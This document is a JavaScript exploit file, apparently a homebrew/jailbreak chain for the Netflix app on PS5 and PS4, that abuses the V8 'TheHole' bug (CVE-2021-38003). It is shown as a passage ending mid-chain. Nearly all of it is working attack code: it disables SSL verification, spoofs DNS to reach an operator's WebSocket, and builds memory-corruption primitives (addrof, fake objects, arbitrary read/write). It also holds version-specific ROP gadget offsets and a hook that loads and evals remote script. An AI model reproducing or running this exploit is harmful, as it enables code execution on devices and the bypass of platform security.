// Netflix PS5 Exploit
// based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
// thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html

// #region WebSocket
const ws = {
    socket: null,
    init(ip, port, callback) {
        nrdp.gibbon._runConsole("/command ssl-peer-verification false");

        nrdp.dns.set("pwn.netflix.com", nrdp.dns.A, {
            addresses: [ip],
            ttl: 3600000
        });

        this.socket = new nrdp.WebSocket(`wss://pwn.netflix.com:${port}`);
        this.socket.onopen = callback;
    },
    send(msg) {
        if (this.socket && this.socket.readyState !== this.socket.CLOSED) {
            this.socket.send(msg);
        }
    }
}
// #endregion
// #region Logger
const logger = {
    overlay: null,
    lines: [],
    widgets: [],
    maxLines: 40,
    refreshTimer: null,
    pendingRefresh: false,
    init() {
        this.overlay = nrdp.gibbon.makeWidget();
        this.overlay.color = { r: 0, g: 0, b: 0, a: 255 };
        this.overlay.width = 1280;
        this.overlay.height = 720;

        nrdp.gibbon.scene.widget = this.overlay;

        // Pre-create all text widgets once to avoid removal/recreation overhead
        for (var i = 0; i < this.maxLines; i++) {
            var w = nrdp.gibbon.makeWidget({
                name: "ln" + i,
                x: 10,
                y: 10 + (i * 17),
                width: 1260,
                height: 15
            });

            w.text = {
                contents: "",
                size: 12,
                color: {
                    a: 255,
                    r: 0,
                    g: 255,
                    b: 0
                },
                wrap: false
            };

            w.parent = this.overlay;
            this.widgets.push(w);
        }
    },
    log(msg) {
        ws.send(msg);
        this.lines.push(msg);
        if (this.lines.length > this.maxLines) this.lines.shift();

        if (this.refreshTimer) nrdp.clearTimeout(this.refreshTimer);
        this.refreshTimer = nrdp.setTimeout(() => {
            this.refresh();
            this.refreshTimer = null;
        }, 50);

        this.pendingRefresh = true;
    },
    refresh() {
        if (!this.overlay) return;

        // Update widget text content without recreating widgets
        for (var i = 0; i < this.maxLines; i++) {
            if (i < this.lines.length) {
                this.widgets[i].text = {
                    contents: this.lines[i],
                    size: 12,
                    color: {
                        a: 255,
                        r: 0,
                        g: 255,
                        b: 0
                    },
                    wrap: false
                };
            } else {
                // Clear unused widget slots
                this.widgets[i].text = {
                    contents: "",
                    size: 12,
                    color: {
                        a: 255,
                        r: 0,
                        g: 255,
                        b: 0
                    },
                    wrap: false
                };
            }
        }

        this.pendingRefresh = false;
    },
    flush() {
        // Force immediate refresh if needed (call before blocking operations)
        if (this.refreshTimer) {
            nrdp.clearTimeout(this.refreshTimer);
            this.refreshTimer = null;
        }
        if (this.pendingRefresh) {
            this.refresh();
        }
    }
}
// #endregion
// #region Pointer Helpers
const buf = new ArrayBuffer(8);
const view = new DataView(buf);
const ptr = {
    il2ih(value) {
        return value << 0x20n;
    },
    ih2il(value) {
        return value >> 0x20n;
    },
    ih(value) {
        return value & ~0xFFFFFFFFn;
    },
    il(value) {
        return value & 0xFFFFFFFFn;
    },
    itag(value) {
    	return value | 1n;
    },
    iuntag(value) {
    	return value & ~1n;
    },
    f2i(value) {
        view.setFloat64(0, value, true);
        return view.getBigUint64(0, true);
    },
    f2ih(value) {
        view.setFloat64(0, value, true);
        return BigInt(view.getUint32(4, true));
    },
    f2il(value) {
        view.setFloat64(0, value, true);
        return BigInt(view.getUint32(0, true));
    },
    i2f(value) {
        view.setBigUint64(0, value, true);
        return view.getFloat64(0, true);
    },
    i2h(value, padded = true) {
        let str = value.toString(16).toUpperCase();
        if (padded) {
            str = str.padStart(16, '0');
        }
        return `0x${str}`;
    }
}
// #endregion

function make_hole () {
    let v1;
    function f0(v4) {
        v4(() => { }, v5 => {
            v1 = v5.errors;
        });
    }
    f0.resolve = function (v6) {
        return v6;
    };
    let v3 = {
        then(v7, v8) {
            v8();
        }
    };
    Promise.any.call(f0, [v3]);
    return v1[1];
}

function make_hole_old () {
    let a = [], b = [];
    let s = '"'.repeat(0x800000);
    a[20000] = s;

    for (let i = 0; i < 10; i++) a[i] = s;
    for (let i = 0; i < 10; i++) b[i] = a;

    try {
        JSON.stringify(b);
    } catch (hole) {
        return hole;
    }

    throw new Error('Could not trigger TheHole');
}

function hex(value)
{
  return "0x" + value.toString(16).padStart(8, "0");
}

var is_ps4 = false;
var is_us = false;
var longjmp_addr = null;  // Global for payloads - set from eboot GOT
var setjmp_addr = null;   // Global for payloads - set from eboot GOT
var syscall_gadget_table = {};  // Global for payloads - syscall gadgets by syscall number
var syscall_wrapper = null;  // Global for payloads - "syscall; ret" gadget address
var eboot_base = null;  // Global for payloads - eboot base address
var g = null;  // Global for payloads - gadgets object
class gadgets {
    constructor() {
        try {
            switch (nrdp.version.nova.app_version) {
                case 'Gemini-U6-2':         // EU 6.000
                    /** Gadgets for Function Arguments **/
                    this.pop_rax = 0x6c233n;
                    this.pop_rdi = 0x1a729bn;
                    this.pop_rsi = 0x14d8n;
                    this.pop_rdx = 0x3ec42n;
                    this.pop_rcx = 0x2485n;
                    this.pop_r8 = 0x6c232n;
                    this.pop_r9 = 0x66511bn;
                    
                    /** Other Gadgets **/
                    this.pop_rbp = 0x79n;
                    this.pop_rbx = 0x2e1ebn;
                    this.pop_rsp = 0x1df1e1n;
                    this.pop_rsp_pop_rbp = 0x17ecb4en;
                    this.mov_qword_ptr_rdi_rax = 0x1dcba9n;
                    break;
                case 'Gemini-U5-18':        // US 5.000
                    /** Gadgets for Function Arguments **/
                    this.pop_rax = 0x6c233n;
                    this.pop_rdi = 0x24f3c2n; // Changed
                    this.pop_rsi = 0x14d8n;
                    this.pop_rdx = 0x3ec42n;
                    this.pop_rcx = 0x2485n;
                    this.pop_r8 = 0x6c232n;
                    this.pop_r9 = 0x66511bn;
                    
                    /** Other Gadgets **/
                    this.pop_rbp = 0x79n;
                    this.pop_rbx = 0x2e1ebn;
                    this.pop_rsp = 0x13c719n; // Changed
                    this.pop_rsp_pop_rbp = 0x17ecb4en;
                    this.mov_qword_ptr_rdi_rax = 0x1dcba9n;
                    break;
                case 'Pollux-U53-7-J':    
                case 'Pollux-U53-7-E':        // PS4 EU 1.53
                    is_ps4 = true;
                    /** Gadgets for Function Arguments (EBOOT) **/
                    this.pop_rax = 0x118dn;
                    this.pop_rdi = 0xe333n;
                    this.pop_rsi = 0x264en;
                    this.pop_rdx = 0x5ff5cfn;
                    this.pop_rcx = 0x18a7n;
                    this.pop_r8 = 0x118cn;
                    this.pop_r9 = 0x7416n;
                    
                    /** Other Gadgets **/
                    this.pop_rbp = 0x79n;
                    this.pop_rbx = 0x2666n;
                    this.pop_rsp = 0x569bn;
                    this.pop_rsp_pop_rbp = 0x60a30n;
                    this.mov_qword_ptr_rsi_rax = 0x2e93c1n;// mov qword ptr [rsi], rax ; ret
                    this.mov_qword_ptr_rdi_rdx = 0x7b83a9n;
                    this.mov_qword_ptr_rdi_rax = 0x5113c9n;
                    this.ret = 0x42n;
                    //this.syscall = 0x1f4dcc5n;

                    //this.mov_qword_ptr_rdi_rax = 0x5153c9n;  
                        
                
                    break;
                    
                case 'Pollux-U53-7-A':        // PS4 US 1.53
                    is_ps4 = true;
                    is_us = true;
                    /** Gadgets for Function Arguments (EBOOT) **/
                    this.pop_rax = 0x118dn;
                    this.pop_rdi = 0xe333n;
                    this.pop_rsi = 0x264en;
                    this.pop_rdx = 0x136c32n;  // changed
                    this.pop_rcx = 0x18a7n;
                    this.pop_r8 = 0x118cn;
                    this.pop_r9 = 0x7416n;
                    
                    /** Other Gadgets **/
                    this.pop_rbp = 0x79n;
                    this.pop_rbx = 0x2666n;
                    this.pop_rsp = 0x569bn;
                    this.pop_rsp_pop_rbp = 0xcbd10n; //changed
                    this.mov_qword_ptr_rsi_rax = 0x3546a1n;//changed
                    this.mov_qword_ptr_rdi_rdx = 0x8236c5n;//changed
                    this.mov_qword_ptr_rdi_rax = 0x57c74dn;//changed
                    this.ret = 0x42n;
                    //this.syscall = 0x1f4dcc5n;

                    //this.mov_qword_ptr_rdi_rax = 0x5153c9n;  
                        
                
                    break;
                default:
                    throw new Error("App version not supported: " + nrdp.version.nova.app_version);
            }
        }
        catch (e) {
            throw new Error("App version not supported : " + e);
        }
    }

    get(gadget) {
        const addr = this[gadget];
        if (addr === undefined) {
            throw new Error("Gadget not found: " + gadget);
        }
        return eboot_base + addr;
    }
}

function stringToBytes (str) {
  const len = str.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    bytes[i] = str.charCodeAt(i);
  }
  return bytes;
}

function hook_tryagain(){
        /***** Hook "Try Again" button to reload exploit *****/
        if (typeof util !== 'undefined' && util.changeLocation) {
            const original_changeLocation = util.changeLocation;
            util.changeLocation = function(url) {
                logger.log("Reloading Javascript...");
                
                logger.flush();

                // Load and eval our injected script instead of reloading app
                nrdp.gibbon.load({
                    url: 'http://127.0.0.1:40002/js/common/config/text/config.text.lruderrorpage.en.js',
                    secure: false
                }, function(result) {
                    logger.flush();

                    if (result.data) {
                        logger.flush();
                        try {
                            eval(result.data);
                        } catch (e) {
                            logger.log("Eval error: " + e.message);
                            logger.log("Stack: " + (e.stack || "none"));
                            logger.flush();
                        }
                    } else {
                        logger.log("Load failed - no data received");
                        logger.flush();
                    }
                });

                // Throw exception to stop execution and prevent state.exit
                throw new Error("Exploit reload initiated");
            };
            logger.log("Enabled Instant JS reload...");
            logger.flush();
        } else {
            logger.log("WARNING: util.changeLocation not found!");
            logger.flush();
        }
    }

function main () {
    
    logger.init();

    logger.log("=== Netflix n Hack ===");
    
    logger.flush(); // Force immediate display
    hook_tryagain();

    try {

        g = new gadgets(); // Load gadgets (make it global for payloads)

        let hole = make_hole();

        let string = "TEXT";

        map1 = new Map();
        map1.set(1, 1);
        map1.set(hole, 1);

        map1.delete(hole);
        map1.delete(hole);
        map1.delete(1);

        oob_arr_temp = new Array(1.1, 2.2, 3.3); // Temporal due that cannot reach a bui64 with map
        oob_arr =  new BigUint64Array([0x4141414141414141n,0x4141414141414141n]);
        victim_arr = new BigUint64Array([0x5252525252525252n,0x5252525252525252n]);
        obj_arr = new Array({},{});

        map1.set(0x10, -1);
        nrdp.gibbon.garbageCollect();
        map1.set(oob_arr_temp, 0x200);
        
        // Let's make oob_arr oversize
        oob_arr_temp[18] = ptr.i2f(0x1000n*8n);  // Size in bytes
        oob_arr_temp[19]= ptr.i2f(0x1000n);      // Size in elements

        // From this point on we can use oob_arr as a more 'stable' primitive until fake objs

        // Elements ptr of victim_arr in first 32b of oob_arr[22]
        // external_ptr[0:31]   --> (oob_arr[25] & ~0xffffffffn) >> 32n
        // external_ptr[63:32]  --> (oob_arr[26] & 0xffffffffn) << 32n
        // base_ptr[0:31]       --> (oob_arr[26] & ~0xffffffffn) >> 32n
        // base_ptr[0:31]       --> (oob_arr[27] & 0xffffffffn) << 32n

        // Elements Ptr of obj_arr in lower 32b (first in mem) of oob_arr[37]
        // Value of obj_arr[0] (ptr to obj) in lower 32b (first in mem) of oob_arr[39]

        function addrof_unstable (obj) {
            obj_arr[0] = obj;
            return (oob_arr[39] & 0xffffffffn) -1n;
        }

        function create_fakeobj_unstable(add) {
            let add_32 = add & 0xffffffffn +1n;     // Just in case 32bits
            let original_value = oob_arr[39];   // Grab full 64bits add in oob_arr[41] to 'save' upper 32bits
            let new_value = (original_value & ~0xffffffffn) + ((add+1n) & 0xffffffffn);
            oob_arr[39] = new_value;
            const fake_obj = obj_arr[0];
            return fake_obj;
        }

        function read64_unstable (add) {
            let add_32 = add & 0xffffffffn;     // Just in case 32bits

            let original_value_25 = oob_arr[25];
            let original_value_26 = oob_arr[26];

            let external_ptr_org_63_32 = (oob_arr[26] & 0xffffffffn);
            
            oob_arr[25] = (original_value_25 & 0xffffffffn) + (add_32 << 32n);
            oob_arr[26] = external_ptr_org_63_32; // re-use upper32 bits of heap from external_ptr, base_ptr 0

            let read_value = victim_arr[0]; // Read the value

            oob_arr[25] = original_value_25;
            oob_arr[26] = original_value_26;

            return read_value;
        }

        function write64_unstable (add, value) {
            let add_32 = add & 0xffffffffn;     // Just in case 32bits

            let original_value_25 = oob_arr[25];
            let original_value_26 = oob_arr[26];

            let external_ptr_org_63_32 = (oob_arr[26] & 0xffffffffn);

            oob_arr[25] = (original_value_25 & 0xffffffffn) + (add_32 << 32n);
            oob_arr[26] = external_ptr_org_63_32; // re-use upper32 bits of heap from external_ptr, base_ptr 0

            victim_arr[0] = value;  // Write the value

            oob_arr[25] = original_value_25;
            oob_arr[26] = original_value_26;
        }     

        function read32_unstable(add){
            let read = read64_unstable(add);
            return read & 0xffffffffn;
        }

        function write32_unstable(add, value) {
            let read = read64_unstable(add);
            let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
            write64_unstable(add, new_value);
        }      
        
        
        let add_string = addrof_unstable(string) + 12n;
        logger.log("Address of 'string' text: " + hex(add_string));
        logger.log("Original value of 'string' (should be 0x54584554): 0x" + read32_unstable(add_string).toString(16) ) ;

        write32_unstable(add_string, 0x41414141n);
        logger.log("Overwritten value of 'string' (should be AAAA): " + string );
        logger.flush();
        
        let typed_arr = new Int8Array(8);
        base_heap_add = read64_unstable(addrof_unstable(typed_arr) + 10n * 4n) & ~0xffffffffn; // Global for payloads
        let top32b_heap = base_heap_add >> 32n;
        logger.log("Base heap address: " + hex(base_heap_add));
        logger.log("Top 32bits heap address: " + hex(top32b_heap));
        let leak_eboot_add = read64_unstable(0x28n); // Read at base heap + 0x28 (upper 32b are completed by v8)
        eboot_base = leak_eboot_add - 0x177CC8n;//- 0x8966C8n; // This is not realiable as the addess changes (global for payloads)
        
        
        if (is_us){ 
            eboot_base = eboot_base - 0x6b2e0n;
        }
        
        
        libkernel_base = undefined; // Will be set later during syscall initialization (global for payloads)
        // Previously used offsets: 0x88C76En , 0x8966C8n
        // Seems to be a ptr that the app updates while running
        // If nothing is changed in the code before this point, it should not change
        logger.log("Leaked eboot add : " + hex(leak_eboot_add));

        logger.log("eboot base : " + hex(eboot_base));
     
        
        /***** Start of Stable Primitives based on fake obj *****/
        /*****        Base on code from Gezine Y2JB         *****/

        // Allocate Large Object Space with proper page metadata
        // Create object array first to initialize page structures
        const stable_array = new Array(0x10000);
        for (let i = 0; i < stable_array.length; i++) {
            stable_array[i] = {};
        }
   
        // Get FixedDoubleArray map from a template
        const double_template = new Array(0x10);
        double_template.fill(3.14);
        const double_template_addr = addrof_unstable(double_template);
        const double_elements_addr = read32_unstable(double_template_addr + 0x8n) - 1n;
        const fixed_double_array_map = read32_unstable(double_elements_addr + 0x00n);
        
        // Get stable_array addresses
        const stable_array_addr = addrof_unstable(stable_array);
        const stable_elements_addr = read32_unstable(stable_array_addr + 0x8n) - 1n;
              
        logger.log('Large Object Space @ ' + hex(stable_elements_addr));
        
        // Transform elements to FixedDoubleArray
        // This makes GC happy later
        write32_unstable(stable_elements_addr + 0x00n, fixed_double_array_map);
        
        logger.log('Converted stable_array to double array');
        
        for (let i = 0; i < stable_array.length; i++) {
            stable_array[i] = 0;
        }

        logger.log("Reserved space filled with 0s");

        // Get templates for stable primitives

        /***** Template for BigUint64Array *****/
        const template_biguint = new BigUint64Array(64);

        const template_biguint_addr = addrof_unstable(template_biguint);
        const biguint_map =      read32_unstable(template_biguint_addr + 0x00n);
        const biguint_props =    read32_unstable(template_biguint_addr + 0x04n);
        const biguint_elements = read32_unstable(template_biguint_addr + 0x08n) - 1n;
        const biguint_buffer =   read32_unstable(template_biguint_addr + 0x0Cn) - 1n;
        
        const biguint_elem_map = read32_unstable(biguint_elements + 0x00n);
        const biguint_elem_len = read32_unstable(biguint_elements + 0x04n);

        const biguint_buffer_map =      read32_unstable(biguint_buffer + 0x00n);
        const biguint_buffer_props =    read32_unstable(biguint_buffer + 0x04n);
        const biguint_buffer_elem =     read32_unstable(biguint_buffer + 0x08n);
        const biguint_buffer_bitfield = read32_unstable(biguint_buffer + 0x24n);

        /***** Template for Object Array *****/
        const template_obj_arr = [{},{}];

        const template_obj_arr_addr = addrof_unstable(template_obj_arr);
        const obj_arr_map =      read32_unstable(template_obj_arr_addr + 0x00n);
        const obj_arr_props =    read32_unstable(template_obj_arr_addr + 0x04n);
        const obj_arr_elements = read32_unstable(template_obj_arr_addr + 0x08n) - 1n;
        const obj_arr_len =      read32_unstable(template_obj_arr_addr + 0x0Cn);
        
        const obj_arr_elem_map = read32_unstable(obj_arr_elements + 0x00n);
        const obj_arr_elem_len = read32_unstable(obj_arr_elements + 0x04n);

        logger.log('Templates extracted');


        const base = stable_elements_addr + 0x100n;

        /*******************************************************/
        /*****       Memory Layout for fake Objects        *****/
        /*******************************************************/
        /***** fake_rw header:          0x0000             *****/
        /***** fake_rw buffer:          0x0040             *****/
        /***** fake_rw elements:        0x1000             *****/
        /*******************************************************/
        /***** fake_bui64_arr header:   0x0100 (inside rw) *****/
        /***** fake_bui64_arr buffer:   0x0150 (inside rw) *****/
        /***** fake_bui64_arr elements: 0x1100             *****/
        /*******************************************************/
        /***** fake_obj_arr header:     0x0200 (inside rw) *****/
        /***** fake_obj_arr elements:   0x0250 (inside rw) *****/
        /*******************************************************/
        /*****       Memory Layout for ROP                 *****/
        /*******************************************************/
        /***** fake_frame init:         0x1250             *****/
        /***** fake_frame center:       0x1300             *****/
        /***** fake_frame end:          0x1350             *****/
        /*******************************************************/
        /***** fake_bytecode init:      0x1400             *****/
        /***** fake_bytecode end:       0x1450             *****/
        /*******************************************************/
        /***** fake_rop_return:         0x1500             *****/
        /*******************************************************/
        /***** fake_rop_arr header:     0x1550             *****/
        /***** fake_rop_arr buffer:     0x1700             *****/
        /***** fake_rop_arr elements:   0x1600             *****/
        /*******************************************************/
       
        // Inside fake_rw_data: fake Array's elements (at the beginning)
        const fake_rw_obj =             base + 0x0000n;
        const fake_rw_obj_buffer =      base + 0x0040n;
        const fake_rw_obj_elements =    base + 0x1000n;

        const fake_bui64_arr_obj =      base + 0x0100n;
        const fake_bui64_arr_buffer =   base + 0x0150n;
        const fake_bui64_arr_elements = base + 0x1100n;

        const fake_obj_arr_obj =        base + 0x0200n;
        const fake_obj_arr_elements =   base + 0x0250n;

        fake_frame =              base + 0x1300n; // No need of fake obj (global for payloads)
        fake_bytecode =           base + 0x1400n; // No need of fake obj (global for payloads)
        fake_rop_return =         base + 0x1500n; // No need of fake obj (global for payloads)

        const fake_rop_arr_obj =        base + 0x1550n;
        const fake_rop_arr_buffer =     base + 0x1700n;
        const fake_rop_arr_elements =   base + 0x1600n;

        /*******************************************************************************************************/
        /**********                             Init Fake OOB BigUInt64Array                          **********/
        /*******************************************************************************************************/
        write32_unstable(fake_rw_obj_buffer + 0x00n, biguint_buffer_map);
        write32_unstable(fake_rw_obj_buffer + 0x04n, biguint_buffer_props);
        write32_unstable(fake_rw_obj_buffer + 0x08n, biguint_buffer_elem);
        write32_unstable(fake_rw_obj_buffer + 0x0cn, 0x1000n*8n);      // byte_length lower 32b
        write32_unstable(fake_rw_obj_buffer + 0x14n, fake_rw_obj_elements + 8n +1n);  // backing_store lower 32b
        write32_unstable(fake_rw_obj_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
        write32_unstable(fake_rw_obj_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field

        write32_unstable(fake_rw_obj_elements + 0x00n, biguint_elem_map);
        write32_unstable(fake_rw_obj_elements + 0x04n, biguint_elem_len);  // Fake size in bytes

        write32_unstable(fake_rw_obj + 0x00n, biguint_map);
        write32_unstable(fake_rw_obj + 0x04n, biguint_props);
        write32_unstable(fake_rw_obj + 0x08n, fake_rw_obj_elements + 1n);
        write32_unstable(fake_rw_obj + 0x0Cn, fake_rw_obj_buffer + 1n);
        write64_unstable(fake_rw_obj + 0x18n, 0x8000n);      // Fake size in bytes
        write64_unstable(fake_rw_obj + 0x20n, 0x1000n);      // Fake size in elements
        write32_unstable(fake_rw_obj + 0x28n, fake_rw_obj_buffer + 16n*4n);  // external_pointer lower 32b
        write32_unstable(fake_rw_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
        write32_unstable(fake_rw_obj + 0x30n, 0n);  // base_pointer lower 32b
        write32_unstable(fake_rw_obj + 0x34n, 0n);  // base_pointer upper 32b
        /*******************************************************************************************************/
        /**********                             End Fake OOB BigUInt64Array                           **********/
        /*******************************************************************************************************/

        /*******************************************************************************************************/
        /**********                             Init Fake Victim BigUInt64Array                       **********/
        /*******************************************************************************************************/
        write32_unstable(fake_bui64_arr_buffer + 0x00n, biguint_buffer_map);
        write32_unstable(fake_bui64_arr_buffer + 0x04n, biguint_buffer_props);
        write32_unstable(fake_bui64_arr_buffer + 0x08n, biguint_buffer_elem);
        write32_unstable(fake_bui64_arr_buffer + 0x0cn, 0x1000n*8n);      // byte_length lower 32b
        write32_unstable(fake_bui64_arr_buffer + 0x14n, fake_bui64_arr_elements + 8n +1n);  // backing_store lower 32b
        write32_unstable(fake_bui64_arr_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
        write32_unstable(fake_bui64_arr_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field

        write32_unstable(fake_bui64_arr_elements + 0x00n, biguint_elem_map);
        write32_unstable(fake_bui64_arr_elements + 0x04n, biguint_elem_len);  // Fake size in bytes

        write32_unstable(fake_bui64_arr_obj + 0x00n, biguint_map);
        write32_unstable(fake_bui64_arr_obj + 0x04n, biguint_props);
        write32_unstable(fake_bui64_arr_obj + 0x08n, fake_bui64_arr_elements + 1n);
        write32_unstable(fake_bui64_arr_obj + 0x0Cn, fake_bui64_arr_buffer + 1n);
        write64_unstable(fake_bui64_arr_obj + 0x18n, 0x40n);      // Fake size in bytes
        write64_unstable(fake_bui64_arr_obj + 0x20n, 0x08n);      // Fake size in elements
        write32_unstable(fake_bui64_arr_obj + 0x28n, fake_bui64_arr_buffer + 16n*4n);  // external_pointer lower 32b
        write32_unstable(fake_bui64_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
        write32_unstable(fake_bui64_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
        write32_unstable(fake_bui64_arr_obj + 0x34n, 0n);  // base_pointer upper 32b
        /*******************************************************************************************************/
        /**********                             End Fake Victim BigUInt64Array                        **********/
        /*******************************************************************************************************/

        /*******************************************************************************************************/
        /**********                             Init Fake Obj Array                                   **********/
        /*******************************************************************************************************/
        write32_unstable(fake_obj_arr_obj + 0x00n, obj_arr_map);
        write32_unstable(fake_obj_arr_obj + 0x04n, obj_arr_props);
        write32_unstable(fake_obj_arr_obj + 0x08n, fake_obj_arr_elements+1n);
        write32_unstable(fake_obj_arr_obj + 0x0cn, obj_arr_len);      // byte_length lower 32b

        write32_unstable(fake_obj_arr_elements + 0x00n, obj_arr_elem_map);
        write32_unstable(fake_obj_arr_elements + 0x04n, obj_arr_elem_len);  // size in bytes << 1
        /*******************************************************************************************************/
        /**********                             End Fake Obj Array                                    **********/
        /*******************************************************************************************************/

        /*******************************************************************************************************/
        /**********                             Init Fake ROP BigUInt64Array                          **********/
        /*******************************************************************************************************/
        write32_unstable(fake_rop_arr_buffer + 0x00n, biguint_buffer_map);
        write32_unstable(fake_rop_arr_buffer + 0x04n, biguint_buffer_props);
        write32_unstable(fake_rop_arr_buffer + 0x08n, biguint_buffer_elem);
        write32_unstable(fake_rop_arr_buffer + 0x0cn, 0x500n*8n);      // byte_length lower 32b
        write32_unstable(fake_rop_arr_buffer + 0x14n, fake_rop_arr_elements + 8n +1n);  // backing_store lower 32b
        write32_unstable(fake_rop_arr_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
        write32_unstable(fake_rop_arr_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field

        write32_unstable(fake_rop_arr_elements + 0x00n, biguint_elem_map);
        write32_unstable(fake_rop_arr_elements + 0x04n, biguint_elem_len);  // Fake size in bytes

        write32_unstable(fake_rop_arr_obj + 0x00n, biguint_map);
        write32_unstable(fake_rop_arr_obj + 0x04n, biguint_props);
        write32_unstable(fake_rop_arr_obj + 0x08n, fake_rop_arr_elements + 1n);
        write32_unstable(fake_rop_arr_obj + 0x0Cn, fake_rop_arr_buffer + 1n);
        write64_unstable(fake_rop_arr_obj + 0x18n, 0x2800n);      // Fake size in bytes
        write64_unstable(fake_rop_arr_obj + 0x20n, 0x0500n);      // Fake size in elements
        write32_unstable(fake_rop_arr_obj + 0x28n, fake_rop_arr_buffer + 16n*4n);  // external_pointer lower 32b
        write32_unstable(fake_rop_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
        write32_unstable(fake_rop_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
        write32_unstable(fake_rop_arr_obj + 0x34n, 0n);  // base_pointer upper 32b
        /*******************************************************************************************************/
        /**********                             End Fake Victim BigUInt64Array                        **********/
        /*******************************************************************************************************/

        // Materialize fake objects
        const fake_rw = create_fakeobj_unstable(fake_rw_obj);
        let fake_rw_add = addrof_unstable(fake_rw);
        //logger.log("This is the add of fake_rw materialized : " + hex(fake_rw_add));

        const fake_victim = create_fakeobj_unstable(fake_bui64_arr_obj);
        let fake_victim_add = addrof_unstable(fake_victim);
        //logger.log("This is the add of fake_victim materialized : " + hex(fake_victim_add));

        const fake_obj_arr = create_fakeobj_unstable(fake_obj_arr_obj);
        let fake_obj_arr_add = addrof_unstable(fake_obj_arr);
        //logger.log("This is the add of fake_obj_arr materialized : " + hex(fake_obj_arr_add));

        fake_rop = create_fakeobj_unstable(fake_rop_arr_obj); // Global for payloads
        let fake_rop_add = addrof_unstable(fake_rop);
        //logger.log("This is the add of fake_rop materialized : " + hex(fake_rop_add));

        // Now we have OOB, Victim and Obj to make stable primitives

        addrof = function(obj) {  // Global for payloads
          fake_obj_arr[0] = obj;
          return (fake_rw[59] & 0xffffffffn) - 1n;
        }


        /***** The following primitives r/w a compressed Add *****/
        /***** The top 32 bits are completed with top32b_heap *****/

        function read64 (add) {
          let add_32 = add & 0xffffffffn; // Just in case
          let original_value = fake_rw[21];
          fake_rw[21] = (top32b_heap<<32n) + add_32; // external_ptr of buffer
          let read_value = fake_victim[0];
          fake_rw[21] = original_value;
          return read_value;
        }

        function write64 (add, value) {
          let add_32 = add & 0xffffffffn; // Just in case
          let original_value = fake_rw[21];
          fake_rw[21] = (top32b_heap<<32n) + add_32; // external_ptr of buffer
          fake_victim[0] = value;
          fake_rw[21] = original_value;
        }

        function read32(add){
          let read = read64(add);
          return  read & 0xffffffffn;
        }

        function write32(add, value) {
          let read = read64(add);
          let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
          write64(add, new_value);
        }

        function read16(add){
          let read1 = read64(add);
          return  read1 & 0xffffn;
        }

        function write16(add, value) {
          let read = read64(add);
          let new_value = (read & ~0xffffn) | (BigInt(value) & 0xffffn);
          write64(add, new_value);
        }

        function read8(add){
          let read = read64(add);
          return  read & 0xffn;
        }

        function write8(add, value) {
          let read = read64(add);
          let new_value = (read & ~0xffn) | (BigInt(value) & 0xffn);
          write64(add, new_value);
        }

        /***** The following primitives r/w a full 64bits Add *****/        

        function read64_uncompressed (add) {
          let original_value = fake_rw[21];
          fake_rw[21] = add; // external_ptr of buffer
          let read_value = fake_victim[0];
          fake_rw[21] = original_value;
          return read_value;
        }

        function write64_uncompressed (add, value) {
          let original_value = fake_rw[21];
          fake_rw[21] = add; // external_ptr of buffer
          fake_victim[0] = value;
          fake_rw[21] = original_value;
        }

        function read32_uncompressed(add){
          let read = read64_uncompressed(add);
          return  read & 0xffffffffn;
        }

        function write32_uncompressed(add, value) {
          let read = read64_uncompressed(add);
          let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
          write64_uncompressed(add, new_value);
        }

        function read16_uncompressed(add){
          let read = read64_uncompressed(add);
          return  read & 0xffffn;
        }

        function write16_uncompressed(add, value) {
          let read = read64_uncompressed(add);
          let new_value = (read & ~0xffffn) | (BigInt(value) & 0xffffn);
          write64_uncompressed(add, new_value);
        }

        function read8_uncompressed(add){
          let read = read64_uncompressed(add);
          return  read & 0xffn;
        }

        function write8_uncompressed(add, value) {
          let read = read64_uncompressed(add);
          let new_value = (read & ~0xffn) | (BigInt(value) & 0xffn);
          write64_uncompressed(add, new_value);
        }

        get_backing_store = function(typed_array) {  // Global for payloads
          const obj_addr = addrof(typed_array);
          // Use read64_uncompressed to get full 64-bit pointers
          const full_obj_addr = (top32b_heap << 32n) + (obj_addr & 0xffffffffn);
          const external = read64_uncompressed(full_obj_addr + 0x28n);
          const base = read64_uncompressed(full_obj_addr + 0x30n);
          return base + external;
        }

        let allocated_buffers = [];

        malloc = function(size) {  // Global for payloads
            const buffer = new ArrayBuffer(size);
            const buffer_addr = addrof(buffer);
            // Use read64_uncompressed to get the full 64-bit backing store address
            const backing_store = read64_uncompressed((top32b_heap << 32n) + (buffer_addr & 0xffffffffn) + 0x14n);
            allocated_buffers.push(buffer);
            return backing_store;
        }

        logger.log("Stable Primitives Achieved.");
        logger.flush();

        // Recalculate eboot_base using stable primitives for full 64-bit address
        // The earlier calculation used unstable primitives which may truncate to 32 bits
        {
            // Read from a known location that contains an eboot pointer
            // Use the same offset as before but with uncompressed read
            const leak_addr = base_heap_add + 0x28n;
            const leak_eboot_add = read64_uncompressed(leak_addr);
            eboot_base = leak_eboot_add - 0x177CC8n;
            if (is_us) {
                eboot_base = eboot_base - 0x6b2e0n;
            }
            logger.log("eboot base (stable): " + hex(eboot_base));
            logger.flush();
        }

        const rop_address = get_backing_store(fake_rop);
        logger.log("Address of ROP obj: " + hex(addrof(fake_rop)) );
        logger.log("Address of ROP: " + hex(rop_address) );
        logger.flush();

        function rop_smash (x) {
          let a = 100;
          return 0x1234567812345678n;
        }

        let value_delete = rop_smash(1); // Generate Bytecode

        add_rop_smash = addrof(rop_smash);
